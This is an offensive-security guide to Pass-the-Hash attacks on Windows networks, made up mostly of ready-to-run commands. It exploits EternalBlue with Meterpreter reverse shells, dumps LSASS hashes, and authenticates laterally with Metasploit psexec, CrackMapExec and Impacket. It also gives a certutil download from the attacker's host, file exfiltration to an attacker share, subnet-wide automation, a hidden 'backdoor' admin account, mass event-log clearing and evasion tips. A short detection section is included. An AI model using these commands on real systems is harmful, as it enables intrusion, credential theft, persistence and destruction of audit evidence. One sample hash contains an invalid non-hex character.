# Pass-the-Hash Attacks: Comprehensive Guide

## Overview

Pass-the-Hash (PtH) is a lateral movement technique that allows attackers to authenticate to remote systems using captured NTLM/LM password hashes without needing to crack them to obtain plaintext passwords.

## Key Concepts

### What is Pass-the-Hash?

- Authentication using NTLM/LM hashes instead of plaintext passwords
- Works because NTLM authentication uses hashes for verification
- No password cracking required
- Provides persistence even if original vulnerability is patched

### Why PtH is Effective

- **Persistence**: Maintain access after service patching
- **Stealth**: No password cracking attempts logged
- **Efficiency**: Direct authentication without brute-forcing
- **Lateral Movement**: Access multiple systems with same credentials

## Prerequisites for PtH Attacks

### Required Information

```bash
# Essential components for PtH
- Target IP address
- Valid username
- NTLM hash (and optionally LM hash)
- SMB service access (port 445)
```

### Hash Format

```
Username: SID: LM Hash: NTLM Hash:::
Example:
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
```

## Metasploit Framework Approach

### Initial Compromise and Hash Extraction

```bash
# Start Metasploit
service postgresql start
msfconsole

# Exploit target (example with EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit

# Migrate to LSASS and dump hashes
ps | grep lsass
migrate <LSASS_PID>
load kiwi
lsa_dump_sam
```

### Using psexec Module for PtH

```bash
# Background current session
background

# Use psexec module
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser Administrator
set SMBPass <LM_hash>:<NTLM_hash>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4433  # Different port to avoid conflicts
exploit
```

### Alternative psexec Configuration

```bash
# If standard method fails, try different targets
set target 1  # Native upload
# or
set target 2  # PowerShell

# Show available targets
show targets
```

## CrackMapExec Approach

### Basic PtH with CrackMapExec

```bash
# Syntax
crackmapexec smb <target_ip> -u <username> -H <ntlm_hash> -x <command>

# Example with administrator hash
crackmapexec smb 192.168.1.100 -u Administrator -H 32ED87BDB5FDC5E9CBA88547376818D4 -x "whoami"

# Execute multiple commands
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> -x "ipconfig"
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> -x "systeminfo"
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> -x "net user"
```

### Advanced CrackMapExec Usage

```bash
# Execute PowerShell commands
crackmapexec smb <target_ip> -u Administrator -H <hash> -X "Get-Process"

# Download file
crackmapexec smb <target_ip> -u Administrator -H <hash> -x "certutil -urlcache -f http://<your_ip>/file.exe C:\\temp\\file.exe"

# Upload file
crackmapexec smb <target_ip> -u Administrator -H <hash> -x "copy C:\\temp\\file.exe \\\\<your_ip>\\share\\file.exe"
```

## Impacket Toolkit Approach

### psexec.py

```bash
# Using Impacket's psexec
psexec.py -hashes <lm_hash>:<ntlm_hash> <domain>/<user>@<target_ip>

# Example
psexec.py -hashes 00000000000000000000000000000000:32ED87BDB5FDC5E9CBA88547376818D4 Administrator@192.168.1.100
```

### wmiexec.py

```bash
# WMI execution (often more reliable)
wmiexec.py -hashes <lm_hash>:<ntlm_hash> <domain>/<user>@<target_ip>

# Example
wmiexec.py -hashes 00000000000000000000000000000000:32ED87BDB5FDC5E9CBA88547376818D4 Administrator@192.168.1.100
```

## Practical Attack Scenarios

### Scenario 1: Lateral Movement

```bash
# After compromising one host, move to others using same credentials
# Discover network hosts
nmap -sn 192.168.1.0/24

# Attempt PtH on all discovered hosts
for ip in $(cat hosts.txt); do
    crackmapexec smb $ip -u Administrator -H <hash> -x "whoami"
done
```

### Scenario 2: Persistence Maintenance

```bash
# Even if original exploit is patched, maintain access via PtH
# Original vulnerability: MS17-010 (patched)
# Maintain access via PtH with dumped hashes
crackmapexec smb <target_ip> -u Administrator -H <hash> -x "net user backdoor Password123! /add"
crackmapexec smb <target_ip> -u Administrator -H <hash> -x "net localgroup administrators backdoor /add"
```

## Hash Management

### Organizing Captured Hashes

```bash
# Create hash database
echo "192.168.1.100:Administrator:32ED87BDB5FDC5E9CBA88547376818D4" >> hashes.txt
echo "192.168.1.101:DomainAdmin:A45B2E1E5F3C8D7E9F1A2B3C4D5E6F7G8" >> hashes.txt

# Use with automation scripts
while IFS=: read -r ip user hash; do
    crackmapexec smb $ip -u $user -H $hash -x "whoami"
done < hashes.txt
```

### Hash Verification

```bash
# Test hash validity before full exploitation
crackmapexec smb <target_ip> -u <user> -H <hash> --local-auth -x "echo Success"
```

## Defense Evasion Techniques

### Obfuscation Methods

```bash
# Use different ports for callbacks
set LPORT 8443
set LPORT 5353
set LPORT 4433

# Use common service names for payloads
set payload windows/meterpreter/reverse_tcp
set PayloadUUIDName https
```

### Cleanup Procedures

```bash
# Remove uploaded files
crackmapexec smb <target_ip> -u Administrator -H <hash> -x "del C:\\windows\\temp\\payload.exe"

# Clear event logs
crackmapexec smb <target_ip> -u Administrator -H <hash> -x "wevtutil el | foreach {wevtutil cl $_}"
```

## Detection and Mitigation

### PtH Attack Indicators

- **SMB Authentication** without preceding Kerberos
- **NTLM Authentication** from unexpected sources
- **Multiple failed** followed by successful NTLM auth
- **Unusual service** creation (PSExec, WMI)

### Prevention Strategies

```bash
# Enable NTLM auditing
# Implement Credential Guard (Windows 10+)
# Use LAPS (Local Administrator Password Solution)
# Restrict WMI and DCOM access
# Monitor for PsExec-like tools
```

## Automation Scripts

### Bulk PtH Testing

```bash
#!/bin/bash
# pth_bulk_tester.sh
TARGET_FILE="targets.txt"
HASH_FILE="hashes.txt"

echo "[*] Starting bulk PtH testing"

while IFS=: read -r target user hash; do
    echo "[*] Testing $target with $user"
    crackmapexec smb $target -u $user -H $hash -x "hostname" | grep -v "ERROR"
done < <(paste -d: $TARGET_FILE $HASH_FILE)

echo "[*] Bulk testing complete"
```

### Metasploit Automation

```ruby
# pth_automation.rc
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser Administrator
set SMBPass AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
```

## Troubleshooting Common Issues

### Common Problems and Solutions

```bash
# Problem: ACCESS_DENIED
# Solution: Verify hash validity and user privileges

# Problem: SMB Session Error
# Solution: Check firewall rules and SMB service status

# Problem: Payload Execution Failed
# Solution: Try different psexec targets or use WMI

# Problem: Hash Format Issues
# Solution: Ensure proper LM:NTLM format (even if LM is zeros)
```

## Key Takeaways

1. **PtH provides persistence** even after vulnerability patching
2. **No password cracking required** - use hashes directly
3. **Multiple tool options** available (Metasploit, CrackMapExec, Impacket)
4. **Effective for lateral movement** across the network
5. **Detection requires monitoring** for NTLM authentication patterns
6. **Proper hash management** is crucial for organized testing

This comprehensive PtH methodology enables maintaining access and lateral movement in Windows environments using captured credential hashes without the need for password cracking.
